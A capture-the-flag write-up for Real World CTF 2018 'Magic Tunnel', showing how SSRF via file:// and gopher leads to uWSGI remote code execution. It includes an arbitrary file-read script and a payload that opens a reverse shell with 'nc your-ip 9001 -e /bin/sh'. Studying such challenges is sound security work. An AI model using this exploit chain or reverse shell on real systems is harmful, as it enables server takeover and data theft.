### References

- [@veneno, RWCTF-Magic Tunnel-WP, 2018-12-06](https://xz.aliyun.com/t/3512)
- [@zaratec, Real World CTF 2018 | Magic Tunnel, 2018-12-20](https://zaratec.github.io/2018/12/20/rwctf2018-magic-tunnel/)
- [@phith0n, realworldctf/magic_tunnel/README.md](https://github.com/phith0n/realworldctf/tree/master/2018/magic_tunnel)
- [@wofeiwo, uWSGI 远程代码执行漏洞](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi-rce-zh.md)

**Tag: SSRF, uWSGI rce**

1.Use `file:///proc/mounts` we can find WEB directory

```tex
/usr/src/rwctf
```

and read `file:///proc/self/cmdline` we can see the process is a uWSGI server with exposed 8000 port.

2.Read arbitrary files script:

```python
import re
import requests

s = requests.session()
response = s.post('http://192.168.200.129:8080/', data={
    'url': 'file:///usr/src/rwctf/manage.py',
    'csrfmiddlewaretoken': 'QSroJ2yRuVRFFXkT2m6hHYlRKdpwK6MYX9f1wcHW87DJeTJelzg3WRZxjIXhHNhp'
}, cookies={'csrftoken': 'QSroJ2yRuVRFFXkT2m6hHYlRKdpwK6MYX9f1wcHW87DJeTJelzg3WRZxjIXhHNhp'}, allow_redirects=True)
# print(response.text)

g = re.search('<img src="(.+?)"', response.text)
filename = g.group(1)
print(filename)

response = s.get('http://192.168.200.129:8080' + filename)
print(response.text)

```

Download and read the source code.

3.Know the "magic variables" [UWSGI_FILE](https://uwsgi-docs.readthedocs.io/en/latest/Vars.html)-Load the specified file as a new dynamic app, and then we can use gopher+SSRF to execute arbitrary script on the server.

4.Download evil.py:

```python
import os
os.system("nc your-ip 9001 -e /bin/sh")
```

![img1](./assets/img1.png?raw=true)

5.Generate evil uwsgi protocol bytes, `/usr/src/rwctf/media/2021/05/16/fb08beef-ebce-41e5-9b75-1316552e102b` is the evil python code that you have downloaded.

6.Use SSRF to send evil bytes to uwsgi port 8000:

![img2](./assets/img2.png?raw=true)

